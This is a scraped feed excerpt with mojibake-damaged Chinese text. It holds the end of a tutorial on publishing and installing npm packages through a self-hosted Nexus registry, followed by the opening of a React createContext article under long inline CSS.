<p>æˆ‘è¿™é‡Œæ˜¯æœ¬åœ°æœ‰å®‰è£…è¿‡,ç›´æ¥å» node_modules å¯»æ‰¾,ç¡®ä¿æœ‰<code>package.json</code> + ä»£ç æ–‡ä»¶,ç„¶ååœ¨ä¾èµ–æ ¹ç›®å½•è¿è¡Œ</p>
<pre><code class="hljs language-shell" lang="shell">npm pack
<span class="hljs-meta prompt_"># </span><span class="bash">æ ¹æ® package.json ç”Ÿæˆ .tgz</span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-variable">${name}</span>-<span class="hljs-variable">${version}</span>.tgz</span>
<span class="hljs-meta prompt_"># </span><span class="bash">å¯ä»¥åœ¨ package.json ä¿®æ”¹ nameã€descriptionã€version</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/078aa0b34e504c249b38132b05fc8d6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=KAdDwWEb8wB9yKbeYdlaxjmu2cs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">6. å‘å¸ƒç§æœ‰åŒ…</h3>
<h4 data-id="heading-11">ğŸŒµ å‡†å¤‡å·¥ä½œ</h4>
<p>è¿™é‡Œæˆ‘æŠ˜è…¾äº†å¥½ä¹…,å§‹ç»ˆ <code>401</code>ğŸ« , è®©æˆ‘ä»¬å°†å…¶æ”¾åœ¨å‡†å¤‡å·¥ä½œéƒ¨åˆ†</p>
<h5 data-id="heading-12">6.1.1. å¯ç”¨ Nexus çš„ "npm Bearer Token Realm" <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/909848e312734d1f894cfd28799e0ca9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=aD485lT7aTrgj4RbcjOqe9orFmw%3D" alt="" loading="lazy"/></h5>
<p>ç„¶åé‡å¯ nexus(ä¸ç”¨æ‹…å¿ƒå‰é¢çš„æ“ä½œç™½è´¹,æˆ‘ä»¬åˆšåˆšåšäº†æŒä¹…åŒ–å‘€) ğŸŒ¸ è®°å¾— <code>save</code></p>
<h5 data-id="heading-13">6.1.2. æ–°å»ºå‘å¸ƒç”¨æˆ·</h5>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d58979ee5a5a4550899b7b84fdea7a3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=z4a4acjgm%2FI4fR8CY1MJBdMPGb0%3D" alt="" loading="lazy"/></p>
<p>è¿™é‡Œæˆ‘ç›´æ¥ç”¨äº† <code>nx-admin</code>æƒé™</p>
<h5 data-id="heading-14">6.1.3. é€‰åš(ç»†åŒ–æƒé™)</h5>
<p>ä¸æƒ³ç”¨ <code>nx-admin</code>æƒé™,å¯ä»¥ç»†åŒ–,å» <code>Settings -&gt; Repository -&gt; Roles</code>æ–°å»ºè§’è‰²å¹¶æˆæƒå³å¯</p>
<h6 data-id="heading-15">æ–°å»ºè§’è‰²</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03f4fddfe24e4da98afb59470e52706c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=KkZPJGcsmMpfrzEC4MtbVrdkaE8%3D" alt="" loading="lazy"/></p>
<p>ä»“åº“<code>npm-hosted</code>ä¸ºä¾‹,éœ€è¦æˆæƒæ‰€æœ‰<code>nx-repository-view-npm-npm-hosted-*</code>æƒé™</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/877f606ad16c42ef834bf3731d98c9ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=DhTU%2FbovFx9G9tY07jmPOEm8vQE%3D" alt="" loading="lazy"/></p>
<h6 data-id="heading-16">ç»™ç”¨æˆ·æˆæƒ</h6>
<p><code>nx-anonymous</code>ï¼ˆè¯»ï¼‰ + <code>è‡ªå®šä¹‰è§’è‰²</code>ï¼ˆå†™ï¼‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c159a5c477b14bcbb9df970556aba88e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=f3hZ13h0qJS1YwnNSwSkxik4ufw%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-17">6.1.4. tip</h5>
<h4 data-id="heading-18">å¦‚æœä½ åˆšåˆšè·³è¿‡äº†å‡†å¤‡å·¥ä½œ,å·²ç»æ‰§è¡Œè¿‡äº† login å‘½ä»¤</h4>
<p>é‚£ä¹ˆå…ˆæ‰§è¡Œ:</p>
<p><code>npm logout --registry=http://127.0.0.1:8081/repository/npm-hosted/</code></p>
<p>ç„¶ååˆ é™¤ <code>~/.npmrc</code>ä¸­ä¸ <code>http://127.0.0.1:8081</code>ç›¸å…³çš„å†…å®¹,å†ç»§ç»­ä¸‹é¢çš„æ­¥éª¤</p>
<h4 data-id="heading-19">1ï¸âƒ£ ç™»å½•ç§æœ‰ä»“åº“</h4>
<pre><code class="hljs language-ini" lang="ini">npm login \
  <span class="hljs-attr">--registry</span>=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/repository/npm-hosted/
</code></pre>
<h4 data-id="heading-20">2ï¸âƒ£ å‘å¸ƒ</h4>
<pre><code class="hljs language-ini" lang="ini">npm publish \
  <span class="hljs-attr">--registry</span>=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/repository/npm-hosted/
</code></pre>
<p>æˆåŠŸååœ¨ <code>npm-hosted</code>å’Œ<code>npm-group</code>éƒ½å¯ä»¥çœ‹è§å‘å¸ƒçš„åŒ…</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4df409791c6849cf91166b620220e5d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=XQfHjJ5BxCGO0dS0Nv53cNtYS54%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-21">7. ä½¿ç”¨ç§æœä¸‹è½½</h3>
<h4 data-id="heading-22">7.1. éƒ¨åˆ†èµ°ç§æœ</h4>
<p>æ˜ç¡®çŸ¥é“æä¸ªåˆ«ä¾èµ–æ˜¯å…¬ç½‘æ²¡æœ‰çš„,ä½¿ç”¨å‰ç¼€åŒºåˆ†,å¯ä»¥è‡ªå®šä¹‰,æˆ‘è¿™é‡Œä½¿ç”¨ <code>@carrie</code></p>
<h5 data-id="heading-23">1ï¸âƒ£ é…ç½®é¡¹ç›® <code>.npmrc</code></h5>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment"># å…¶ä»–ä¾èµ–èµ°å…¬å…±é•œåƒ</span>
registry=<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/registry.npmjs.org/</span>
<span class="hljs-comment"># <span class="hljs-doctag">@carrie</span> å‰ç¼€çš„ä¾èµ–èµ°ç§æœ æ³¨æ„:åœ¨å‘åŒ…çš„æ—¶å€™ä¹Ÿéœ€è¦æœ‰ <span class="hljs-doctag">@carrie</span>å‰ç¼€</span>
<span class="hljs-variable">@carrie</span><span class="hljs-symbol">:registry=http</span><span class="hljs-symbol">://</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">8081</span>/repository/npm-group/
</code></pre>
<h5 data-id="heading-24">2ï¸âƒ£ è¿è¡Œ <code>npm i</code></h5>
<h5 data-id="heading-25">package-lock.json åˆ†æ</h5>
<p>package-lock.json ä¸­</p>
<ul>
<li>@carrie å‰ç¼€çš„åŒ… resolved æ˜¯ç§æœ</li>
<li>å…¶ä»–åŒ… resolved æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Fregistry.npmjs.org%2F" target="_blank" title="https://registry.npmjs.org/" ref="nofollow noopener noreferrer">registry.npmjs.org/</a></li>
</ul>
<h4 data-id="heading-26">7.2. å…¨éƒ¨èµ°ç§æœ</h4>
<h5 data-id="heading-27">1ï¸âƒ£ é…ç½®é¡¹ç›® <code>.npmrc</code></h5>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">registry</span>=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/repository/npm-group/
</code></pre>
<p>æ‰€æœ‰çš„ä¾èµ–éƒ½ä»ç§æœä¸‹è½½</p>
<p>ç§æœå†…éƒ¨: ä¼˜å…ˆå» npm-hosted ä¸‹è½½,æ²¡æœ‰åˆ™èµ° npm-proxy é…ç½®åˆ°å…¬å…±é•œåƒæºä¸‹è½½</p>
<h5 data-id="heading-28">2ï¸âƒ£ è¿è¡Œ <code>npm i</code></h5>
<h5 data-id="heading-29">package-lock.json åˆ†æ</h5>
<p>package-lock.json ä¸­</p>
<ul>
<li>æ‰€æœ‰åŒ…çš„ resolved éƒ½æ˜¯ç§æœ</li>
</ul>
<h3 data-id="heading-30">8. å…±ç”¨</h3>
<p>å‰é¢æ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åœ¨æœ¬åœ° <code>docker</code> è·‘çš„,è¦åˆ†äº«ç»™å…¶ä»–äººä½¿ç”¨åªéœ€è¦å°† docker é•œåƒè·‘åœ¨æœåŠ¡å™¨å³å¯(ä½¿ç”¨æ–¹è®°å¾—å°† <code>registry</code> æ›¿æ¢ä¸ºæœåŠ¡å™¨çš„è·¯å¾„)</p>
<p>æœ‰è¶£ ğŸŒ»</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React createContext è·¨ç»„ä»¶å…±äº«æ•°æ®å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7592548677744394286</link>    <guid>https://juejin.cn/post/7592548677744394286</guid>    <pubDate>2026-01-08T03:23:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677744394286" data-draft-id="7592552501579726874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React createContext è·¨ç»„ä»¶å…±äº«æ•°æ®å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:23:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤å¤©çš„é£æŠšè¿‡è€³è†œ"/> <meta itemprop="url" content="https://juejin.cn/user/1319870834942269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React createContext è·¨ç»„ä»¶å…±äº«æ•°æ®å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1319870834942269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤å¤©çš„é£æŠšè¿‡è€³è†œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:23:25.000Z" title="Thu Jan 08 2026 03:23:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒä½œç”¨</h2>
<h3 data-id="heading-1">1. context å®šä¹‰</h3>
<p><code>createContext</code> æ˜¯ React å†…ç½® APIï¼Œæ ¸å¿ƒç›®çš„æ˜¯ <strong>è·¨ç»„ä»¶å…±äº«æ•°æ®</strong>ï¼Œé¿å… â€œçˆ¶â†’å­â†’å­™â€ é€å±‚ä¼ é€’ <code>props å±æ€§é€ä¼ </code> çš„ç¹çé—®é¢˜ï¼ˆå³ â€œprop drillingâ€ï¼‰ã€‚ç®€å•è¯´ï¼šå®ƒèƒ½åˆ›å»ºä¸€ä¸ª â€œå…¬å…±æ•°æ®ç›’å­â€ï¼Œé¡¶å±‚ç»„ä»¶ä¸€æ¬¡æä¾›æ•°æ®ï¼Œæ‰€æœ‰åµŒå¥—å­ç»„ä»¶éƒ½èƒ½ç›´æ¥è¯»å–ï¼Œä¸ç”¨ä¸­é—´ç»„ä»¶è½¬å‘ã€‚</p>
<h2 data-id="heading-2">äºŒã€context å‘½å</h2>
<h3 data-id="heading-3">1. ä¸ºå•¥ååå«ã€ŒUserContextã€ï¼Ÿ</h3>
<p>å› ä¸ºè¿™ä¸ª <code>Context</code> çš„æ ¸å¿ƒç”¨é€”æ˜¯ <strong>å­˜å‚¨å’Œå…±äº« â€œç”¨æˆ·ç›¸å…³çš„ä¿¡æ¯â€</strong> ï¼ˆæ¯”å¦‚ä¹‹å‰ä¾‹å­é‡Œçš„ç”¨æˆ·åã€å¹´é¾„ã€ä¿®æ”¹ç”¨æˆ·çš„æ–¹æ³•ï¼‰ï¼Œåå­—å’Œç”¨é€”å®Œå…¨å¯¹åº”ï¼š</p>
<ul>
<li>å‰ç¼€ <code>User</code>ï¼šæ˜ç¡®å‘Šè¯‰åˆ«äºº â€œè¿™ä¸ªä¸Šä¸‹æ–‡é‡Œå­˜çš„æ˜¯ç”¨æˆ·ç›¸å…³çš„æ•°æ®â€ï¼›</li>
<li>åç¼€ <code>Context</code>ï¼šæ˜ç¡®å‘Šè¯‰åˆ«äºº â€œè¿™æ˜¯ä¸€ä¸ª React Context å®¹å™¨â€ï¼ˆä¸æ˜¯æ™®é€šå˜é‡ã€ä¸æ˜¯ç»„ä»¶ï¼‰ã€‚</li>
</ul>
